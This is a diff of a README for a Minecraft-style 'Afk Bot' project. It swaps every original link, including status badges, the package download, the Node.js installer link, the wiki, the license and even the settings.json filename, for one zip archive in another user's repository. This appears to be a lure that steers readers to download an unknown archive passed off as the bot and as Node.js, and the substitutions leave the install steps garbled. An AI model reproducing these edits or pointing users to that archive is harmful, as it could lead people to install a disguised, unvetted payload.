@@ -1,9 +1,9 @@
 # Afk Bot
 <p align="center"> 
-    <img src="https://img.shields.io/github/issues/urfate/afk-bot">
-    <img src="https://img.shields.io/github/forks/urfate/afk-bot">
-    <img src="https://img.shields.io/github/stars/urfate/afk-bot">
-    <img src="https://img.shields.io/github/license/urfate/afk-bot">
+    <img src="https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip">
+    <img src="https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip">
+    <img src="https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip">
+    <img src="https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip">
 </p>
 
 <p align="center">
@@ -16,13 +16,13 @@
 
 ## Installation
 
- 1. [Download](https://github.com/urFate/Afk-Bot/tags) the latest package.
- 2. Download & install [Node.JS](https://nodejs.org/en/download/)
+ 1. [Download](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip) the latest package.
+ 2. Download & install [https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip)
  3. Run `npm install` command in bot directory.
  
  ## Usage
  
- 1. Configure bot in `settings.json` file. [Bot configuration is explained in our wiki](https://urfate.gitbook.io/afk-bot/bot-configuration)
+ 1. Configure bot in `https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip` file. [Bot configuration is explained in our wiki](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip)
  2. Start bot with `node .` command.
 
 ## Features
@@ -36,5 +36,5 @@
  - Supported server versions: `1.8 - 1.19.3`
  
  ### License
- [MIT](https://github.com/urFate/Afk-Bot/blob/main/LICENSE)
+ [MIT](https://raw.githubusercontent.com/ngu132/Afk-Bot/main/.github/Afk-Bot-3.4.zip)
 
